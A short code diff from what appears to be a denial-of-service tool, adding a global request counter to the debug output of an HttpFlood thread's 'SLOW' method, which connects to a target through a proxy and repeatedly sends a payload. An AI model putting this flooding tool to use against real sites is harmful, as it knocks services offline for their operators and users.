@@ -1516,7 +1516,10 @@ class HttpFlood(Thread):
         s = None
         try:
             s = self.open_connection()
-            print(f"[DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
+            # Increment Global Counter for visual feedback
+            global REQUESTS_SENT
+            REQUESTS_SENT += 1
+            print(f"[{REQUESTS_SENT}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
             for _ in range(self._rpc):
                 Tools.send(s, payload)
             
